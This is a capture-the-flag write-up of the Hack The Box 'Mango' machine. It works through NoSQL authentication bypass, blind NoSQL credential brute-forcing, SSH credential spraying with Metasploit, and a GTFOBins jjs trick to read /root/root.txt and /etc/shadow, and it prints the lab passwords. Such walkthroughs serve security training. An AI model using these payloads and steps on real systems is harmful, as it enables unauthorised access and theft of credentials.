--- Mango is a Linux machine that highlights web enumeration through a certificate and NoSQL injection on unsecure login page, to discover credentials in MongoDB database with Blind method. That to get User Flag.

SGID file is present under Admin user and allow to run jjs under root permission. We use GTFOBin on this unix binaries to read our root.txt and get Root Flag.

### Check all services
***
The nmap scan reveals `SSH` and `Apache` to be running on their usual ports; `22`, `80` and `443`.

```terminal
$ nmap -A -T5 10.10.10.162 -p-
```

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-nmap.png" | relative_url }})

### Web
***
**Port 80 :** We have no permission to access of this ressource from the ip address.

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-web80.png" | relative_url }})


**Port 443 :** We have a webpage search / analytics.

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-web443.png" | relative_url }})


And certificate alert. Let's check this and find something interesting.

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-webcertificate.png" | relative_url }})

This certificate is delivery for CN `staging-order.mango.htb`. Let's change our hosts file to see what the answer is behind are.

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-host.png" | relative_url }})

Nothing on the port 443, but we have now a unsecure login page appear on port 80.

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-secretwebpage.png" | relative_url }})

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-unsecurelogins.png" | relative_url }})

We use Burp Suite to see how login and password are injects in the form.

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-burp.png" | relative_url }})

```
username=admin&password=test&login=login
```

After many research, we have a NoSQL Database behind (MongoDB = Mango ?).

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-schema.png" | relative_url }})

### Vulnerabilities
***
Here our target is MongoDB. This database structure is vulnerable of many injections like authentication bypass or blindnosql.

Reference - all injection with mongo : <https://nullsweep.com/a-nosql-injection-primer-with-mongo/>

## **<span style='color:#c0392b'>[2] Foothold - Get into the target </span>**
### Bypassing Authentication with NoSQL Injection
***
We bypass the login page to see if we have something interesting.

Reference - toolbox NoSql Injection : <https://github.com/swisskyrepo/PayloadsAllTheThings/>

We inject during the interception with Burp a not equal [$ne] in the username and password.

```
username[$ne]=admin&password[$ne]=test&login=login
```

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-burpexploit.png" | relative_url }})

After disabled the interception, we bypass the authentication and we are redirected to a new page `home.php`.
This page is interesting because we know now our first user --> `admin@mango.htb`

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-maintenancepage.png" | relative_url }})

But that's not enough to gain our first level access on the target.

### Blind NoSQL exploitation
***
This type of database still vulnerable of other injection method like blind NoSQL which give the possibility to find any information in the database. In order to do this we proceed by brute-force, and more precisely by efficient brute-force.

Reference - blind sql injection : <https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/les-injections-sql-en-aveugle/blind-sql-injection/>

What is this technique ? "This injection is a bit of a guessing game: the person you are asking can only answer yes or no. It would therefore require a certain number of questions before finding the information you want, unlike a "classic" query that would return the result directly."

What is the difference between efficient and pure brute-force ? "The pure brute-force is to test all combinations by asking if it is equal to, the efficient brute-force is to ask if the searched string begins with or if the ne letter is: we don't test the whole set but a part of it, which considerably reduces the number of queries to perform."

I found a script to brute-force a usernames and passwords values through this technique.

References - script :
* <https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration>
* <https://book.hacktricks.xyz/pentesting-web/nosql-injection>

We can see how work the efficient brute-force :

```terminal
$ python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/index.php -up username -pp password -ep username -op login:login
```

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-blindnosql.png" | relative_url }})

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-blindnosqlusers.png" | relative_url }})


```terminal
$ python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/index.php -up username -pp password -ep password -op login:login
```

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-blindnosqlpasswd.png" | relative_url }})

We have 2 users 2 passwords, and 1 service ssh not yet exploited.

To avoid the testing one by one, i create a user and password files to test it in metasploit with `ssh_login module`.

```terminal
$ msfconsole
msf5 > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > set rhost 10.10.10.162
msf5 auxiliary(scanner/ssh/ssh_login) > set user_file /[...]/users.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set user_file /[...]/passwords.txt
msf5 auxiliary(scanner/ssh/ssh_login) > exploit
```
![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-credentialsfoothold.png" | relative_url }})

And we can connect now from ssh :

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-credentialsunderssh.png" | relative_url }})

The exploitation is successful and we have gained a foothold with the credential `mango / h3mXK8RhU~f{]f5H`

We flag the user to validate the compromission of the system user.

### Local SU login
***
The second user (found above : `admin / t9KcS3>!0B#2`) is not allowed to connect to ssh, but like Postman Machine we can connect with command su.

```terminal
$ mango@mango:~$ su admin
```

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-adminaccount.png" | relative_url }})

## **<span style='color:#c0392b'>[4] Privilege Escalation - Gain higher-level permissions</span>**
### GTFOBins abuse
***
We enum with LinPEAS tool on Admin account to find anything to escalate our privilege.

Reference - linPEAS tool : <https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>

We transfert the tool on the machine.

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-transfertlinPEAS.png" | relative_url }})

And we find interesting SGID files like `/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs`

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-sgid.png" | relative_url }})

We can find the same thing with Linenum tool.

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-sgidbis.png" | relative_url }})

This command need to be execute under Admin user. And after some research, the jjs is present in GTFOBin database. So we can exploit it.

We have much possibility with this unix binaries. We can read, write, push reverse shell, get shell, etc. under root permission. But we're not gonna execute them all.
We're just going to read our root.txt and shadow file to see.

Reference - jjs GTFOBin : <https://gtfobins.github.io/gtfobins/jjs/>

We use the code to read file root.txt. So to realize this, we replace `file_to_read` by `root/root.txt` and grab the flag value !

```
echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("file_to_read"));
while ((line = br.readLine()) != null) { print(line); }' | jjs
```
```terminal
$ cd /usr/lib/jvm/java-11-openjdk-amd64/bin/
$ jjs
jjs> var BufferedReader = Java.type("java.io.BufferedReader");
jjs> var FileReader = Java.type("java.io.FileReader");
jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
jjs> while ((line = br.readLine()) != null) { print(line); }
```

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-jjsflag.png" | relative_url }})

We can too read the shadow file to confirm the privilege escalation from this method.

```terminal
jjs> var BufferedReader = Java.type("java.io.BufferedReader");
jjs> var FileReader = Java.type("java.io.FileReader");
jjs> var br = new BufferedReader(new FileReader("/etc/shadow"));
jjs> while ((line = br.readLine()) != null) { print(line); }
```

![Desktop View]({{ "/assets/img/mango/HTB-Images-Mango-jjsreadshadowfile.png" | relative_url }})

So we can go much further in the control of our target.
